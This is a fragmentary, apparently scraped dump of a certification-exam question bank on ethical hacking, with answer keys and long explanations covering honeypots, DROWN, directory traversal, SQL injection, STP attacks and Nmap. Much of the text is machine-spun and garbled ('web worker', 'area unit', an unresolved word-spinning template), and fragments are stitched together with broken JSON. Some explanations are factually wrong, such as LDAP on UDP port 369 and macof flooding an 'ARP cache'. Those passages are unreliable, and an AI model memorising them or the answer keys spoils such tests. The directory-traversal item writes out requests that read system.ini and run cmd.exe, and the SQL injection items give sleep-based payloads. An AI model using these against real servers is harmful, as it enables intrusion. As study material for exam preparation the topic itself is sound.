      "B": "Honeypot",
      "C": "BotnetD Firewall"
    },
    "correct_answer": 1,
    "explanation": "A honeypot may be a trap that an IT pro lays for a malicious hacker, hoping that they will interact with it during a way that gives useful intelligence. It’s one among the oldest security measures in IT, but beware: luring hackers onto your network, even on an isolated system, are often a dangerous game. honeypot may be a good starting place: “A honeypot may be a computer or computing system intended to mimic likely targets of cyberattacks.” Often a honeypot are going to be deliberately configured with known vulnerabilities in situation to form a more tempting or obvious target for attackers. A honeypot won’t contain production data or participate in legitimate traffic on your network — that’s how you’ll tell anything happening within it’s a results of an attack. If someone’s stopping by, they’re up to no good. That definition covers a various array of systems, from bare-bones virtual machines that only offer a couple of vulnerable systems to ornately constructed fake networks spanning multiple servers. and therefore the goals of these who build honeypots can vary widely also , starting from defense thorough to academic research. additionally , there’s now an entire marketing category of deception technology that, while not meeting the strict definition of a honeypot, is certainly within the same family. But we’ll get thereto during a moment. honeypots aim to permit close analysis of how hackers do their dirty work. The team controlling the honeypot can watch the techniques hackers use to infiltrate systems, escalate privileges, and otherwise run amok through target networks. These sorts of honeypots are found out by security companies, academics, and government agencies looking to look at the threat landscape. Their creators could also be curious about learning what kind of attacks are out there, getting details on how specific sorts of attacks work, or maybe trying to lure a specific hackers within the hopes of tracing the attack back to its source. These systems are often inbuilt fully isolated lab environments, which ensures that any breaches don’t end in non-honeypot machines falling prey to attacks. Production honeypots, on the opposite hand, are usually deployed in proximity to some organization’s production infrastructure, though measures are taken to isolate it the maximum amount as possible. These honeypots often serve both as bait to distract hackers who could also be trying to interrupt into that organization’s network, keeping them faraway from valuable data or services; they will also function a canary within the coalpit , indicating that attacks are underway and are a minimum of partially succeeding."

    "question": "Samuel a security administrator, is assessing the configuration of a web server. He noticed that the server permits SSlv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. This vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information. Which of the following attacks can be performed by exploiting the above vulnerability?",
    "answers": {
      "A": "DROWN attack",
      "B": "Padding oracle attack",
      "C": "Side-channel attack",
      "D": "DUHK attack"
    },
    "correct_answer": 0,
    "explanation": "DROWN is a serious vulnerability that affects HTTPS and other services that deem SSL and TLS, someof the essential cryptographic protocols for net security. These protocols allow everyone on the netto browse the net, use email, look on-line, and send instant messages while not third-parties beingable to browse the communication. DROWN allows attackers to break the encryption and read or steal sensitive communications, as well as passwords, credit card numbers, trade secrets, or financial data. At the time of public disclosure on March 2016, our measurements indicated thirty third of all HTTPS servers were vulnerable to the attack. fortuitously, the vulnerability is much less prevalent currently. As of 2019, SSL Labs estimates that one.2% of HTTPS servers are vulnerable. What will the attackers gain? Any communication between users and the server. This typically includes, however isn’t limited to, usernames and passwords, credit card numbers, emails, instant messages, and sensitive documents. under some common scenarios, an attacker can also impersonate a secure web site and intercept or change the content the user sees. Who is vulnerable? Websites, mail servers, and other TLS-dependent services are in danger for the DROWN attack. At the time of public disclosure, many popular sites were affected. we used Internet-wide scanning to live how many sites are vulnerable: Operators of vulnerable servers got to take action. there’s nothing practical that browsers or endusers will do on their own to protect against this attack. Is my site vulnerable? Modern servers and shoppers use the TLS encryption protocol. However, because of misconfigurations, several servers also still support SSLv2, a 1990s-era precursor to TLS. This support did not matter in practice, since no up-to-date clients really use SSLv2. Therefore, despite the fact that SSLv2 is thought to be badly insecure, until now, simply supporting SSLv2 wasn’t thought of a security problem, is a clients never used it. DROWN shows that merely supporting SSLv2 may be a threat to fashionable servers and clients. It modern associate degree attacker to modern fashionable TLS connections between up-to-date clients and servers by sending probes to a server that supports SSLv2 and uses the same private key. A server is vulnerable to DROWN if: It allows SSLv2 connections. This is surprisingly common, due to misconfiguration and inappropriate default settings. Its private key is used on any other serverthat allows SSLv2 connections, even for another protocol. Many companies reuse the same certificate and key on their web and email servers, for instance. In this case, if the email server supports SSLv2 and the web server does not, an attacker can take advantage of the email server to break TLS connections to the web server. How do I protect my server? To protect against DROWN, server operators need to ensure that their private keys software used anyplace with server computer code that enables SSLv2 connections. This includes net servers, SMTP servers, IMAP and POP servers, and the other software that supports SSL/TLS. Disabling SSLv2 is difficult and depends on the particular server software. we offer instructions here for many common products: OpenSSL: OpenSSL may be a science library employed in several server merchandise. For users of OpenSSL, the simplest and recommended solution is to upgrade to a recent OpenSSL version. OpenSSL 1.0.2 users ought to upgrade to 1.0.2g. OpenSSL 1.0.1 users ought to upgrade to one.0.1s. Users of older OpenSSL versions ought to upgrade to either one in every of these versions. (Updated March thirteenth, 16:00 UTC) Microsoft IIS (Windows Server): Support for SSLv2 on the server aspect is enabled by default only on the OS versions that correspond to IIS 7.0 and IIS seven.5, particularly Windows scene, Windows Server 2008, Windows seven and Windows Server 2008R2. This support is disabled within the appropriate SSLv2 subkey for ‘Server’, as outlined in KB245030. albeit users haven’t taken the steps to disable SSLv2, the export-grade and 56-bit ciphers that build DROWN possible don’t seem to be supported by default. Network Security Services (NSS): NSS may be a common science library designed into several server merchandise. NSS versions three.13 (released back in 2012) and higher than ought to have SSLv2 disabled by default. (A little variety of users might have enabled SSLv2 manually and can got to take steps to disable it.) Users of older versions ought to upgrade to a more moderen version. we tend to still advocate checking whether or not your non-public secret is exposed elsewhere Other affected software and in operation systems: Instructions and data for: Apache, Postfix, Nginx, Debian, Red Hat Browsers and other consumers: practical nothing practical that net browsers or different client computer code will do to stop DROWN. only server operators ar ready to take action to guard against the attack."

    "correct_answer": 3,
    "explanation": "Appropriately controlling admittance to web content is significant for running a safe web worker. Index crossing or Path Traversal is a HTTP assault which permits aggressors to get to limited catalogsand execute orders outside of the web worker’s root registry. Web workers give two primary degrees of security instruments Access Control Lists (ACLs) Root index An Access Control List is utilized in the approval cycle. It is a rundown which the web worker’s manager uses to show which clients or gatherings can get to, change or execute specific records on the worker, just as other access rights. The root registry is a particular index on the worker record framework in which the clients are kept. Clients can’t get to anything over this root. For instance: the default root registry of IIS on Windows is C:\\Inetpub\\wwwroot and with this arrangement, a client doesn’t approach C:\\Windows yet approaches C:\\Inetpub\\wwwroot ews and some other indexes and documents under the root catalog (given that the client is confirmed by means of the ACLs). The root index keeps clients from getting to any documents on the worker, for example, C:\\WINDOWS/system32/win.ini on Windows stages and the/and so on/passwd record on Linux/UNIX stages. This weakness can exist either in the web worker programming itself or in the web application code. To play out a registry crossing assault, all an assailant requires is an internet browser and some information on where to aimlessly discover any default documents and registries on the framework. What an assailant can do if your site is defenseless With a framework defenseless against index crossing, an aggressor can utilize this weakness to venture out of the root catalog and access different pieces of the record framework. This may enable the assailant to see confined documents, which could give the aggressor more data needed to additional trade off the framework. Contingent upon how the site access is set up, the aggressor will execute orders by mimicking himself as the client which is related with “the site”. Along these lines everything relies upon what the site client has been offered admittance to in the framework. Illustration of a Directory Traversal assault by means of web application code In web applications with dynamic pages, input is generally gotten from programs through GET or POST solicitation techniques. Here is an illustration of a HTTP GET demand URL GET http://test.webarticles.com/show.asp?view=oldarchive.html HTTP/1.1 Host: test.webarticles.com With this URL, the browser requests the dynamic page show.asp from the server and with it also sends the parameter view with the value of oldarchive.html. When this request is executed on the web server, show.asp retrieves the file oldarchive.html from the server’s file system, renders it and then sends it back to the browser which displays it to the user. The attacker would assume that show.asp can retrieve files from the file system and sends the following custom URL. GET http://test.webarticles.com/show.asp?view=../../../../../Windows/system.ini HTTP/1.1Host: test.webarticles.comThis will cause the dynamic page to retrieve the file system.ini from the file system and display it tothe user. The expression ../ instructs the system to go one directory up which is commonly used as anoperating system directive. The attacker has to guess how many directories he has to go up to findthe Windows folder on the system, but this is easily done by trial and error. Example of a Directory Traversal attack via web server Apart from vulnerabilities in the code, even the web server itself can be open to directory traversal attacks. The problem can either be incorporated into the web server software or inside some sample script files left available on the server. The vulnerability has been fixed in the latest versions of web server software, but there are web servers online which are still using older versions of IIS and Apache which might be open to directory traversal attacks. Even though you might be using a web server software version that has fixed this vulnerability, you might still have some sensitive default script directories exposed which are well known to hackers. For example, a URL request which makes use of the scripts directory of IIS to traverse directories and execute a command can be GET http://server.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\\ HTTP/1.1 Host: server.com The request would return to the user a list of all files in the C:\\ directory by executing the cmd.exe command shell file and run the command dir c:\\ in the shell. The %5c expression that is in the URL request is a web server escape code which is used to represent normal characters. In this case %5c represents the character \\. Newer versions of modern web server software check for these escape codes and do not let them through. Some older versions however, do not filter out these codes in the root directory enforcer and will let the attackers execute such commands."

    "correct_answer": 0,
    "explanation": "DNS uses Ports 53 which is almost always open on systems, firewalls, and clients to transmit DNS queries. instead of the more familiar Transmission Control Protocol (TCP) these queries use User Datagram Protocol (UDP) due to its low- latency, bandwidth and resource usage compared TCPequivalent queries. UDP has no error or flow-control capabilities, nor does it have any integrity checking to make sure the info arrived intact. How is internet use (browsing, apps, chat etc) so reliable then? If the UDP DNS query fails (it’s a besteffort protocol after all) within the first instance, most systems will retry variety of times and only after multiple failures, potentially switch to TCP before trying again; TCP is additionally used if the DNS query exceeds the restrictions of the UDP datagram size – typically 512 bytes for DNS but can depend upon system settings. Figure 1 below illustrates the essential process of how DNS operates: the client sends a question string (for example, mail.google[.]com during this case) with a particular type – typically A for a number address. I’ve skipped the part whereby intermediate DNS systems may need to establish where ‘.com’ exists, before checking out where ‘google[.]com’ are often found, and so on. Many worms and scanners are created to seek out and exploit systems running telnet. Given these facts, it’s really no surprise that telnet is usually seen on the highest Ten Target Ports list. Several of the vulnerabilities of telnet are fixed. They require only an upgrade to the foremost current version of the telnet Daemon or OS upgrade. As is usually the case, this upgrade has not been performed on variety of devices. this might flow from to the very fact that a lot of systems administrators and users don’t fully understand the risks involved using telnet. Unfortunately, the sole solution for a few of telnets vulnerabilities is to completely discontinue its use. the well-liked method of mitigating all of telnets vulnerabilities is replacing it with alternate protocols like ssh. Ssh is capable of providing many of an equivalent functions as telnet and a number of other additional services typical handled by other protocols like FTP and Xwindows. Ssh does still have several drawbacks to beat before it can completely replace telnet. it’s typically only supported on newer equipment. It requires processor and memory resources to perform the info encryption and decryption. It also requires greater bandwidth than telnet thanks to the encryption of the info . This paper was written to assist clarify how dangerous the utilization of telnet are often and to supply solutions to alleviate the main known threats so as to enhance the general security of the web Once a reputation is resolved to an IP caching also helps: the resolved name-to-IP is usually cached on the local system (and possibly on intermediate DNS servers) for a period of your time . Subsequent queries for an equivalent name from an equivalent client then don’t leave the local system until said cache expires. Of course, once the IP address of the remote service is understood , applications can use that information to enable other TCP-based protocols, like HTTP, to try to to their actual work, for instance ensuring internet cat GIFs are often reliably shared together with your colleagues. So, beat all, a couple of dozen extra UDP DNS queries from an organization’s network would be fairly inconspicuous and will leave a malicious payload to beacon bent an adversary; commands could even be received to the requesting application for processing with little difficulty."

    },
    "correct_answer": 3,
    "explanation": "https://en.wikipedia.org/wiki/Presentation_layer In the seven-layer OSI model of computer networking, the presentation layer is layer 6 and serves as the data translator for the network. It is sometimes called the syntax layer. The presentation layer is responsible for the formatting and delivery of information to the application layer for further processing or display. Encryption is typically done at this level too, although it can be done on the application, session, transport, or network layers, each having its own advantages and disadvantages. Decryption is also handled at the presentation layer. For example, when logging on to bank account sites the presentation layer will decrypt the data as it is received."

    "question": "Nathan is testing some of his network devices. Nathan is using Macof to try and flood the ARP cache of these switches. If these switches' ARP cache is successfully flooded, what will be the result?",
    "answers": {
      "A": "The switches will drop into hub mode if the ARP cache is successfully flooded.",
      "B": "If the ARP cache is flooded, the switches will drop into pix mode making it less susceptible to attacks.",
      "C": "Depending on the switch manufacturer, the device will either delete every entry in its ARP cache or reroute packets to the nearest switch.",
      "D": "The switches will route all traffic to the broadcast address created collisions."
    },
    "correct_answer": 0,
    "explanation": "Macof is a tool that floods the ARP (Address Resolution Protocol) cache on switches with random data. This can cause the switch to fill its MAC address table with incorrect entries, potentially flooding it. If the ARP cache is flooded, the switch may not be able to properly learn the MAC addresses of devices on the network. As a result, the switch might fall back to hub mode, where it behaves like a hub and broadcasts all incoming traffic to every port, which can lead to network congestion and security vulnerabilities."

In this process, Richard recorded the frequency required to share information between connected devices. After obtaining the frequency, he captured the original data when commands were initiated by the connected devices. Once the original data were collected, he used free tools such as URH to segregate the command sequence. Subsequently, he started injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices.

Which two SQL injection types would give her the results she is looking for?",
    "answers": {
      "A": "Out of band and boolean-based",
      "B": "Union-based and error-based",
      "C": "Time-based and union-based",
      "D": "Time-based and boolean-based"
    },
    "correct_answer": 3,
    "explanation": "Boolean-based SQL injection is a type of attack where the attacker sends a malicious query to the database that will return a different response depending on whether the query returns a TRUE or FALSE result. For example, the attacker might send the query SELECT * FROM users WHERE id = '1' AND '1' = '2'. If the user ID 1 exists in the database, the query will return no results. However, if the user ID 1 does not exist in the database, the query will return all of the rows in the users table. Time-based SQL injection is a type of attack where the attacker sends a malicious query to the database that will cause the database to take a different amount of time to execute depending on whether the query returns a TRUE or FALSE result. For example, the attacker might send the query SELECT * FROM users WHERE id = '1' AND sleep(5). If the user ID 1 exists in the database, the query will return no results. However, if the user ID 1 does not exist in the database, the query will cause the database to sleep for 5 seconds before returning results. In this case, Jane Smith wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. She can do this by using a time-based SQL injection attack. She would first send the query SELECT * FROM users WHERE id = '1' AND sleep(5). If the user ID 1 exists in the database, the query will return no results. However, if the user ID 1 does not exist in the database, the query will cause the database to sleep for 5 seconds before returning results. Jane Smith can then use a second command to measure the time it takes for the database to respond. If the response time is greater than 5 seconds, then she knows that the user ID 1 does not exist in the database."

      "C": "Serverless computing",
      "D": "Container technology"
    },
    "correct_answer": 1,
    "explanation": "Zero trust network is a security model that assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. This is in contrast to traditional security models, which assume that users inside the network are trusted and only need to be authenticated once. Zero trust network is implemented by using a variety of security controls, such as: - Micro-segmentation: This is the practice of dividing the network into small, isolated segments, each with its own security controls. This makes it more difficult for an attacker to move laterally within the network once they have gained access. - Multi-factor authentication: This requires users to provide multiple pieces of identification, such as a username, password, and security token, before being granted access to the network. - Continuous monitoring: This involves monitoring all network traffic for suspicious activity. - Least privilege: This principle states that users should only be granted the access they need to perform their job duties. In Eric's case, he is implementing a zero trust network by verifying every incoming connection before allowing access to the network. He is also imposing conditions such that employees can only access the resources required for their role. This is a good way to secure cloud resources and protect them from unauthorized access."

      "D": "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails."
    },
    "correct_answer": 1,
    "explanation": "The service running on port 369 is Lightweight Directory Access Protocol (LDAP). LDAP is a protocol used to access and manage directory information, such as user accounts and passwords. LDAP is typically used over UDP port 389, but it can also be used over TCP port 369. The auditors have found that the LDAP service on your network is running over UDP port 369. This is a security risk because UDP is a connectionless protocol, which means that packets can be lost or corrupted. If an attacker is able to intercept an LDAP packet, they could potentially steal user credentials or other sensitive information. To address this security risk, you should change the LDAP service to run over TCP port 636. TCP is a connection-oriented protocol, which means that packets are guaranteed to be delivered. LDAPS is a secure version of LDAP that uses Transport Layer Security (TLS) to encrypt the communication between the client and server."

    "explanation": "In a TCP SYN ping scan, Nmap sends a TCP SYN packet to the target port, expecting a SYN-ACK or RST response from an open port. If the response is RST, it means the port is closed. If there is no response, the port may be either open or filtered. This method is used to detect whether a port is open or closed. The -sn option in Nmap is used for host discovery, and it disables port scanning. The -PS option is used to specify a TCP SYN ping scan, while the -PA and -PP options are used for TCP ACK and ICMP ping scans, respectively.

      "C": "AES",
      "D": "MD5 encryption algorithm"
    },
    "correct_answer": 1,
    "explanation": "Triple DES is another mode of DES operation. It takes three 64-bit keys, for an overall key length of 192 bits. In Stealth, you merely type within the entire 192-bit (24 character) key instead of entering each of the three keys individually. The Triple DES DLL then breaks the user-provided key into three subkeys, padding the keys if necessary in order that they are each 64 bits long. The procedure for encryption is strictly an equivalent as regular DES, but it's repeated 3 times , hence the name Triple DES. the info is encrypted with the primary key, decrypted with the second key, and eventually encrypted again with the third key. Triple DES runs 3 times slower than DES, but is far safer if used properly. The procedure for decrypting something is that the same because the procedure for encryption, except it's executed in reverse. Like DES, data is encrypted and decrypted in 64-bit chunks. Although the input key for DES is 64 bits long, the particular key employed by DES is merely 56 bits long . the smallest amount significant (right-most) bit in each byte may be a parity , and will be set in order that there are always an odd number of 1s in every byte. These parity bits are ignored, so only the seven most vital bits of every byte are used, leading to a key length of 56 bits. this suggests that the effective key strength for Triple DES is really 168 bits because each of the three keys contains 8 parity bits that aren't used during the encryption process. Triple DES Modes Triple ECB (Electronic Code Book) - This variant of Triple DES works precisely the same way because the ECB mode of DES. - This is often the foremost commonly used mode of operation. Triple CBC (Cipher Block Chaining) - This method is extremely almost like the quality DES CBC mode. - Like Triple ECB, the effective key length is 168 bits and keys are utilized in an equivalent manner, as described above, but the chaining features of CBC mode also are employed. · the primary 64- bit key acts because the Initialization Vector to DES. - Triple ECB is then executed for one 64-bit block of plaintext. - The resulting ciphertext is then XORed with subsequent plaintext block to be encrypted, and therefore the procedure is repeated. - This method adds an additional layer of security to Triple DES and is therefore safer than Triple ECB, although it's not used as widely as Triple ECB."

    "explanation": "A mirror site may be a website or set of files on a computer server that has been copied to a different computer server in order that the location or files are available from quite one place. A mirror site has its own URL, but is otherwise just like the principal site. Load-balancing devices allow high- volume sites to scale easily, dividing the work between multiple mirror sites. A mirror site is typically updated frequently to make sure it reflects the contents of the first site. In some cases, the first site may arrange for a mirror site at a bigger location with a better speed connection and, perhaps, a better proximity to an outsized audience. If the first site generates an excessive amount of traffic, a mirror site can ensure better availability of the web site or files. For websites that provide copies or updates of widely used software, a mirror site allows the location to handle larger demands and enables the downloaded files to arrive more quickly. Microsoft, Sun Microsystems and other companies have mirror sites from which their browser software are often downloaded. Mirror sites are wont to make site access faster when the first site could also be geographically distant from those accessing it. A mirrored web server is usually located on a special continent from the principal site, allowing users on the brink of the mirror site to urge faster and more reliable access. Mirroring an internet site also can be done to make sure that information are often made available to places where access could also be unreliable or censored. In 2013, when Chinese authorities blocked access to foreign media outlets just like the Wall Street Journal and Reuters, site mirroring was wont to restore access and circumvent government censorship."

      "B": "Persistence",
      "C": "Cleanup",
      "D": "Preparation"
    },
    "correct_answer": 0,
    "explanation": "After the attacker completes preparations, subsequent step is an effort to realize an edge within the target's environment. a particularly common entry tactic is that the use of spearphishing emails containing an internet link or attachment. Email links usually cause sites where the target's browser and related software are subjected to varied exploit techniques or where the APT actors plan to social engineer information from the victim which will be used later. If a successful exploit takes place, it installs an initial malware payload on the victim's computer. Figure 2 illustrates an example of a spearphishing email that contains an attachment. Attachments are usually executable malware, a zipper or other archive containing malware, or a malicious Office or Adobe PDF (Portable Document Format) document that exploits vulnerabilities within the victim's applications to ultimately execute malware on the victim's computer. Once the user has opened a malicious file using vulnerable software, malware is executing on the target system. These phishing emails are often very convincing and difficult to differentiate from legitimate email messages. Tactics to extend their believability include modifying legitimate documents from or associated with the organization. Documents are sometimes stolen from the organization or their collaborators during previous exploitation operations. Actors modify the documents by adding exploits and malicious code then send them to the victims. Phishing emails are commonly sent through previously compromised email servers, email accounts at organizations associated with the target or public email services. Emails also can be sent through mail relays with modified email headers to form the messages appear to possess originated from legitimate sources. Exploitation of vulnerabilities on public-facing servers is another favorite technique of some APT groups. Though this will be accomplished using exploits for known vulnerabilities, 0-days are often developed or purchased to be used in intrusions as required."

      "B": "STP attack",
      "C": "DNS poisoning attack",
      "D": "VLAN hopping attack"
    },
    "correct_answer": 1,
    "explanation": "In a Spanning Tree Protocol (STP) attack, attackers connect a rogue switch into the network to change the operation of the STP protocol and sniff all the network traffic. STP is used in LAN- switched networks with the primary function of removing potential loops within the network. STP ensures that the traffic inside the network follows an optimized path to enhance network performance. In this process, a switch inside the network is appointed as the root bridge. After the selection of the root bridge, other switches in the network connect to it by selecting a root port (the closest port to the root bridge). The root bridge is selected with the help of Bridge Protocol Data Units (BPDUs). BPDUs each have an identification number known as a BID or ID. These BIDs consist of the Bridge Priority and the MAC address. By default, the value of the Bridge Priority is 32769. If an attacker has access to two switches, he/she introduces a rogue switch in the network with a priority lower than any other switch in the network. This makes the rogue switch the root bridge, thus allowing the attacker to sniff all the traffic flowing in the network."

The attacker then uses this list to scan and infect the vulnerable machines. Once a machine is compromised, it can be used to scan for and infect other vulnerable machines on the list. The list is then divided among the compromised machines, and the scanning process continues until all the machines on the list are infected. This technique is often used to create botnets, which are networks of infected machines that can be controlled by the attacker. Botnets can be used for various purposes, such as launching DDoS attacks, stealing sensitive information, or distributing spam or malware.

    "correct_answer": 1,
    "explanation": "A white hat (or a white hat hacker) is an ethical computer hacker, or a computer security expert, who focuses on penetration testing and in other testing methodologies that ensures the safety of an organization's information systems. Ethical hacking may be a term meant to imply a broader category than simply penetration testing. Contrasted with black hat, a malicious hacker, the name comes from Western films, where heroic and antagonistic cowboys might traditionally wear a white and a black hat respectively. While a white hat hacker hacks under good intentions with permission, and a black hat hacker, most frequently unauthorized, has malicious intent, there's a 3rd kind referred to as a gray hat hacker who hacks with good intentions but sometimes without permission. White hat hackers can also add teams called \"sneakers and/or hacker clubs\",red teams, or tiger teams. While penetration testing concentrates on attacking software and computer systems from the beginning scanning ports, examining known defects in protocols and applications running on the system and patch installations, as an example ethical hacking may include other things. A full- blown ethical hack might include emailing staff to invite password details, searching through executive's dustbins and typically breaking and entering, without the knowledge and consent of the targets. Only the owners, CEOs and Board Members (stake holders) who asked for such a censoring of this magnitude are aware. to undertake to duplicate a number of the destructive techniques a true attack might employ, ethical hackers may arrange for cloned test systems, or organize a hack late in the dark while systems are less critical. In most up-to-date cases these hacks perpetuate for the long- term con (days, if not weeks, of long-term human infiltration into an organization). Some examples include leaving USB/flash key drives with hidden auto-start software during a public area as if someone lost the tiny drive and an unsuspecting employee found it and took it. Some other methods of completing these include: · DoS attacks · Social engineering tactics · Reverse engineering · Network security · Disk and memory forensics · Vulnerability research · Security scanners such as: W3af Nessus Burp suite · Frameworks such as: Metasploit · Training Platforms These methods identify and exploit known security vulnerabilities and plan to evade security to realize entry into secured areas. they're ready to do that by hiding software and system 'back-doors' which will be used as a link to information or access that a non-ethical hacker, also referred to as 'black-hat' or 'grey-hat', might want to succeed in."

    "correct_answer": 2,
    "explanation": "One of the most common Nmap usage scenarios is scanning an Ethernet LAN. Most LANs, especially those that use the private address range granted by RFC 1918, do not always use the overwhelming majority of IP addresses. When Nmap attempts to send a raw IP packet, such as an ICMP echo request, the OS must determine a destination hardware (ARP) address, such as the target IP, so that the Ethernet frame can be properly addressed. This is required to issue a series of ARP requests. This is best illustrated by an example where a ping scan is attempted against an Area Ethernet host. The –send-ip option tells Nmap to send IP-level packets (rather than raw Ethernet), even on area networks. The Wireshark output of the three ARP requests and their timing have been pasted into the session. Raw IP ping scan example for offline targets This example took quite a couple of seconds to finish because the (Linux) OS sent three ARP requests at 1 second intervals before abandoning the host. Waiting for a few seconds is excessive, as long as the ARP response usually arrives within a few milliseconds. Reducing this timeout period is not a priority for OS vendors, as the overwhelming majority of packets are sent to the host that actually exists. Nmap, on the other hand, needs to send packets to 16 million IP s given a target like 10.0.0.0/8. Many targets are pinged in parallel, but waiting 2 seconds each is very delayed. There is another problem with raw IP ping scans on the LAN. If the destination host turns out to be unresponsive, as in the previous example, the source host usually adds an incomplete entry for that destination IP to the kernel ARP table. ARP tablespaces are finite and some operating systems become unresponsive when full. If Nmap is used in rawIP mode (–send-ip), Nmap may have to wait a few minutes for the ARP cache entry to expire before continuing host discovery. ARP scans solve both problems by giving Nmap the highest priority. Nmap issues raw ARP requests and handles retransmissions and timeout periods in its sole discretion. The system ARP cache is bypassed. The example shows the difference. This ARP scan takes just over a tenth of the time it takes for an equivalent IP. Example b ARP ping scan of offline target In example b, neither the -PR option nor the -send-eth option has any effect. This is often because ARP has a default scan type on the Area Ethernet network when scanning Ethernet hosts that Nmap discovers. This includes traditional wired Ethernet as 802.11 wireless networks. As mentioned above, ARP scanning is not only more efficient, but also more accurate. Hosts frequently block IP-based ping packets, but usually cannot block ARP requests or responses and communicate over the network.Nmap uses ARP instead of all targets on equivalent targets, even if different ping types (such as -PE and -PS) are specified. LAN.. If you do not need to attempt an ARP scan at all, specify – send-ip as shown in Example a “Raw IP Ping Scan for Offline Targets”. If you give Nmap control to send raw Ethernet frames, Nmap can also adjust the source MAC address. If you have the only PowerBook in your security conference room and a large ARP scan is initiated from an Apple-registered MAC address, your head may turn to you. Use the –spoof-mac option to spoof the MAC address as described in the MAC Address Spoofing section. "

This weakness misuses an iOS highlight called iTunes Wi-Fi sync, which permits a client to deal with their iOS gadget without genuinely interfacing it to their PC. A solitary tap by the iOS gadget proprietor when the two are associated with a similar organization permits an assailant to oversee the gadget. Furthermore, we will stroll through past related weaknesses and show the progressions that iPhone has made to alleviate them, and why these are adequately not to forestall comparative assaults. After interfacing an iOS gadget to another PC, the clients are being found out if they trust the associated PC or not. Deciding to believe the PC permits it to speak with the iOS gadget by means of the standard iTunes APIs. This permits the PC to get to the photographs on the gadget, perform reinforcement, introduce applications and considerably more, without requiring another affirmation from the client and with no recognizable sign.

    "explanation": "Internet Relay Chat (IRC) is an application layer protocol that facilitates communication in text. The chat process works on a client/server networking model. IRC clients are computer programs that users can install on their system or web-based applications running either locally in the browser or on a third-party server. These clients communicate with chat servers to transfer messages to other clients. IRC is a plaintext protocol that is officially assigned port 194, according to IANA. However, running the service on this port requires running it with root-level permissions, which is inadvisable. As a result, the well-known port for IRC is 6667, a high-number port that does not require elevated privileges. However, an IRC server can also be configured to run on other ports as well. You can't tell if an IRC server is designed to be malicious solely based on port number. Still, if you see an IRC server running on port a WKP such as 80, 8080, 53, 443, it's almost always going to be malicious; the only real reason for IRCD to be running on port 80 is to try to evade firewalls. https://en.wikipedia.org/wiki/Application_firewall An application firewall is a form of firewall that controls input/output or system calls of an application or service. It operates by monitoring and blocking communications based on a configured policy, generally with predefined rule sets to choose from. The application firewall can control communications up to the OSI model's application layer, which is the highest operating layer, and where it gets its name. The two primary categories of application firewalls are network- based and host-based. Application layer filtering operates at a higher level than traditional security appliances. This allows packet decisions to be made based on more than just source/destination IP Addresses or ports. It can also use information spanning across multiple connections for any given host. Network-based application firewalls Network-based application firewalls operate at the application layer of a TCP/IP stack. They can understand certain applications and protocols such as File Transfer Protocol (FTP), Domain Name System (DNS), or Hypertext Transfer Protocol (HTTP). This allows it to identify unwanted applications or services using a non-standard port or detect if an allowed protocol is being abused. Host-based application firewalls A host-based application firewall monitors application system calls or other general system communication. This gives more granularity and control but is limited to only protecting the host it is running on. Control is applied by filtering on a per-process basis. Generally, prompts are used to define rules for processes that have not yet received a connection. Further filtering can be done by examining the process ID of the owner of the data packets. Many host-based application firewalls are combined or used in conjunction with a packet filter. "

Like other viruses, a stealth virus can take hold of the many parts of one’s PC. When taking control of the PC and performing tasks, antivirus programs can detect it, but a stealth virus sees that coming and can rename then copy itself to a special drive or area on the disc, before the antivirus software. Once moved and renamed a stealth virus will usually replace the detected ‘infected’ file with a clean file that doesn’t trigger anti-virus detection. It’s a never- ending game of cat and mouse. The intelligent architecture of this sort of virus about guarantees it’s impossible to completely rid oneself of it once infected.

    "explanation": "https://ru.wikipedia.org/wiki/DNS_spoofing DNS spoofing is a threat that copies the legitimate server destinations to divert the domain's traffic. Ignorant these attacks, the users are redirected to malicious websites, which results in insensitive and personal data being leaked. It is a method of attack where your DNS server is tricked into saving a fake DNS entry. This will make the DNS server recall a fake site for you, thereby posing a threat to vital information stored on your server or computer. The cache poisoning codes are often found in URLs sent through spam emails. These emails are sent to prompt users to click on the URL, which infects their computer. When the computer is poisoned, it will divert you to a fake IP address that looks like a real thing. This way, the threats are injected into your systems as well. Different Stages of Attack of DNS Cache Poisoning: - The attacker proceeds to send DNS queries to the DNS resolver, which forwards the Root/TLD authoritative DNS server request and awaits an answer. - The attacker overloads the DNS with poisoned responses that contain several IP addresses of the malicious website. To be accepted by the DNS resolver, the attacker's response should match a port number and the query ID field before the DNS response. Also, the attackers can force its response to increasing their chance of success. - If you are a legitimate user who queries this DNS resolver, you will get a poisoned response from the cache, and you will be automatically redirected to the malicious website.

    "explanation": "Bug bounty programs allow independent security researchers to report bugs to an companies and receive rewards or compensation. These bugs area unit sometimes security exploits and vulnerabilities, although they will additionally embody method problems, hardware flaws, and so on. The reports area unit usually created through a program travel by associate degree freelance third party (like Bugcrowd or HackerOne). The companies can got wind of (and run) a program curated to the organization’s wants. Programs is also non-public (invite-only) wherever reports area unit unbroken confidential to the organization or public (where anyone will sign in and join). they will happen over a collection timeframe or with without stopping date (though the second possibility is a lot of common). Who uses bug bounty programs? Many major organizations use bug bounties as an area of their security program, together with AOL, Android, Apple, Digital Ocean, and goldman Sachs. you’ll read an inventory of all the programs offered by major bug bounty suppliers, Bugcrowd and HackerOne, at these links. Why do corporations use bug bounty programs? Bug bounty programs provide corporations the flexibility to harness an outsized cluster of hackers so as to seek out bugs in their code. This gives them access to a bigger variety of hackers or testers than they’d be able to access on a one-on-one basis. It {can also|also will|can even|may also|may} increase the probabilities that bugs area unit found and reported to them before malicious hackers can exploit them. It may also be an honest publicity alternative for a firm. As bug bounties became a lot of common, having a bug bounty program will signal to the general public and even regulators that a corporation incorporates a mature security program. This trend is likely to continue, as some have began to see bug bounty programs as an business normal that all companies ought to invest in. Why do researchers and hackers participate in bug bounty programs? Finding and news bugs via a bug bounty program may end up in each money bonuses and recognition. In some cases, it will be a good thanks to show real-world   expertise once you are looking for employment, or will even facilitate introduce you to parents on the protection team within an companies. This can be full time income for a few of us, income to supplement employment, or the way to point out off your skills and find a full time job. It may also be fun! it is a nice (legal) probability to check out your skills against huge companies and government agencies. What area unit the disadvantages of a bug bounty program for independent researchers and hackers? A lot of hackers participate in these varieties of programs, and it will be tough to form a major quantity of cash on the platform. In order to say the reward, the 